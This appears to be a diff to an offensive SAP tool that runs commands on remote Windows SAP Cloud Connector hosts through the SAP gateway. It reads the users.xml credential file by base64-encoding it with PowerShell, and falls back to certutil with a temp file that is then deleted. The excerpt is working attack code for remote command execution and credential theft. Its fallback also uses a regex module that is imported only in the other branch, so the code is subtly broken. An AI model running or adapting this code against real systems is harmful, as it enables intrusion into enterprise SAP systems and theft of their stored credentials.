@@ -1928,18 +1928,53 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         print(f"[-] SCC {host}: users.xml not found via "
                               f"{n.sid} on Windows")
                         continue
-                    # Read with 'more' — user-confirmed to work on Windows SCC.
-                    # certutil base64 output is also truncated by SAPXPG's
-                    # 128-byte line limit causing padding errors.
-                    more_out, more_ok = _gw("cmd.exe", f"/c more \"{fpath}\"")
-                    print(f"[*] SCC {host}: more read → "
-                          f"{len(more_out)}B ok={more_ok} "
-                          f"first={more_out[:60]!r}")
-                    raw = more_out.encode("utf-8", errors="replace") \
-                        if more_out.strip().startswith("<") else None
-                    if raw is None and more_out:
-                        print(f"[-] SCC {host}: more output doesn't look like XML: "
-                              f"{more_out[:80]!r}")
+                    # Use PowerShell to base64-encode the file with short
+                    # line width (60 chars) so every line stays under
+                    # SAPXPG's 128-byte output limit.
+                    ps_cmd = (
+                        f"[Convert]::ToBase64String("
+                        f"[IO.File]::ReadAllBytes('{fpath}'),"
+                        f"'InsertLineBreaks')"
+                        f" -replace '(.{{60}})','$1`n'"
+                    )
+                    # PowerShell -Command via cmd /c
+                    ps_out, ps_ok = _gw(
+                        "cmd.exe",
+                        f"/c powershell -NoProfile -NonInteractive "
+                        f"-Command \"{ps_cmd}\"")
+                    print(f"[*] SCC {host}: powershell b64 → "
+                          f"{len(ps_out)}B ok={ps_ok}")
+                    import base64 as _b64e
+                    raw = None
+                    if ps_out and ps_out.strip():
+                        b64 = ps_out.replace("\n","").replace("\r","").strip()
+                        # Strip any leading/trailing non-base64
+                        import re as _re2
+                        b64 = "".join(_re2.findall(r'[A-Za-z0-9+/=]+', b64))
+                        try:
+                            raw = _b64e.b64decode(b64)
+                            print(f"[*] SCC {host}: decoded {len(raw)}B")
+                        except Exception as e:
+                            print(f"[-] SCC {host}: b64 decode error: {e}")
+                    if raw is None:
+                        # Fallback: chunked certutil — write to temp, read
+                        # in 70-char lines, reassemble
+                        tmp = r"C:\Windows\Temp\.scc_u.b64"
+                        _gw("cmd.exe",
+                            f"/c certutil -encode \"{fpath}\" \"{tmp}\" 2>nul")
+                        # Read temp file line by line via more (each line ≤76B)
+                        tmp_out, _ = _gw("cmd.exe", f"/c more \"{tmp}\"")
+                        _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
+                        if tmp_out:
+                            b64 = "".join(_re2.findall(
+                                r'[A-Za-z0-9+/=]+', tmp_out))
+                            try:
+                                raw = _b64e.b64decode(b64)
+                                print(f"[*] SCC {host}: certutil fallback "
+                                      f"decoded {len(raw)}B")
+                            except Exception as e:
+                                print(f"[-] SCC {host}: certutil fallback "
+                                      f"decode error: {e}")
                 else:
                     linux_roots = [
                         "/opt/sap/scc",
